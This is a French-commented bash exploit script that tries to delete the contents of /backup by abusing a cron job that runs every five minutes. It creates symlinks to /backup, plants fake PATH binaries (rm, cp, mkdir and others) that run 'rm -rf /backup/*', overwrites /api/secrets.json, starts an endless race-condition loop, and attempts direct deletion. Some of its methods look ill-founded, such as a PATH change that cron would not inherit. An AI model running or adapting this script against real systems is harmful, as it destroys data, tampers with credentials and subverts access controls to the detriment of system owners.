#!/bin/bash

# Script d'exploitation complet pour supprimer /backup
# En ciblant le script cron exécuté toutes les 5 minutes

echo "[+] Démarrage de l'exploitation pour supprimer /backup"
echo "[+] Création du répertoire de travail..."

# Préparation des répertoires
mkdir -p ~/exploit
mkdir -p ~/delete_me
mkdir -p ~/fake_bin

# Journalisation
LOGFILE=~/exploit/exploit.log
exec > >(tee -a "$LOGFILE") 2>&1

echo "[+] Exploitation initiée à $(date)"

# Méthode 1: Création de liens symboliques dans divers emplacements
echo "[*] Méthode 1: Création de liens symboliques..."
ln -sf /backup ~/backup_link
ln -sf /backup ~/exploit/backup_link
for i in {1..10}; do
    mkdir -p ~/exploit/tmp$i
    ln -sf /backup ~/exploit/tmp$i/backup_link
done

# Tenter de créer dans /tmp malgré les restrictions
for i in {1..5}; do
    ln -sf /backup /tmp/backup_link 2>/dev/null
    ln -sf /backup /tmp/link$i 2>/dev/null
done

echo "[*] Liens symboliques créés"

# Méthode 2: Exploitation du PATH avec des binaires détournés
echo "[*] Méthode 2: Détournement des binaires via PATH..."

# Liste des commandes à intercepter
COMMANDS=("mkdir" "cp" "rm" "ls" "gzip" "sha256sum" "head" "awk" "chown" "date")

# Création de faux binaires pour chaque commande
for cmd in "${COMMANDS[@]}"; do
    cat > ~/fake_bin/$cmd <<EOL
#!/bin/bash
# Tentative de suppression du contenu de /backup
rm -rf /backup/* 2>/dev/null
# Alternative avec liens symboliques
ln -sf /backup/* ~/delete_me/ 2>/dev/null
# Tentative de copie du /dev/null vers tous les fichiers
for file in /backup/*; do
    cp /dev/null "\$file" 2>/dev/null
done
# Exécution de la commande originale
/usr/bin/$cmd "\$@"
EOL
    chmod +x ~/fake_bin/$cmd
    echo "[+] Créé $cmd détourné"
done

# Ajout du répertoire au PATH
export PATH=~/fake_bin:$PATH
echo "[*] PATH modifié: $PATH"

# Méthode 3: Exploitation du fichier /api/secrets.json
echo "[*] Méthode 3: Tentative de manipulation de /api/secrets.json..."
if [ -f /api/secrets.json ]; then
    echo "[+] Fichier secrets.json trouvé, tentative de modification..."
    cp /api/secrets.json ~/exploit/secrets.json.bak 2>/dev/null
    # Tentatives de modification du fichier pour déclencher une sauvegarde
    for i in {1..5}; do
        echo "{\"modified\":$i}" > /api/secrets.json 2>/dev/null
        sleep 2
    done
fi

# Méthode 4: Exploitation de race conditions
echo "[*] Méthode 4: Exploitation de race conditions..."

# Démarrer un processus en arrière-plan qui tente constamment de créer des liens
echo "[+] Démarrage du processus de création de liens en continu..."
(
while true; do
    # Création continue de liens symboliques
    ln -sf /backup ~/delete_me/backup_race 2>/dev/null
    ln -sf /backup /tmp/backup_race 2>/dev/null
    
    # Tentative de modification du fichier secrets.json
    echo "{\"race\":$(date +%s)}" > /api/secrets.json 2>/dev/null
    
    # Création de faux fichiers temporaires
    DATE=$(date +%s)
    mkdir -p /tmp/$DATE 2>/dev/null
    
    # Attente courte pour ne pas surcharger le système
    sleep 0.5
done
) &
RACE_PID=$!
echo "[+] Processus de race condition démarré avec PID $RACE_PID"

# Méthode 5: Exploitation via création de dossiers temporaires
echo "[*] Méthode 5: Création de dossiers temporaires malveillants..."
for i in {1..10}; do
    DATE=$(date +%s)
    mkdir -p ~/exploit/tmp_$DATE 2>/dev/null
    ln -sf /backup ~/exploit/tmp_$DATE/backup_link 2>/dev/null
    sleep 1
done

# Méthode 6: Tentative directe de suppression
echo "[*] Méthode 6: Tentative directe de suppression..."
rm -rf /backup/* 2>/dev/null
find /backup -type f -exec rm {} \; 2>/dev/null

# Méthode 7: Création de liens symboliques inversés
echo "[*] Méthode 7: Liens symboliques inversés..."
mkdir -p ~/to_be_deleted
touch ~/to_be_deleted/file_to_delete
ln -sf ~/to_be_deleted /backup/symlink_trap 2>/dev/null

# Attente pour que le cron s'exécute
echo "[+] Toutes les méthodes d'exploitation ont été tentées"
echo "[+] En attente que le script cron s'exécute (environ 5 minutes)..."
echo "[+] Vérifiez périodiquement le contenu de /backup avec 'ls -la /backup'"
echo "[+] Pour arrêter le processus de race condition: kill $RACE_PID"

# Message final
echo "[+] Exploitation terminée à $(date)"
echo "[+] Log sauvegardé dans $LOGFILE"
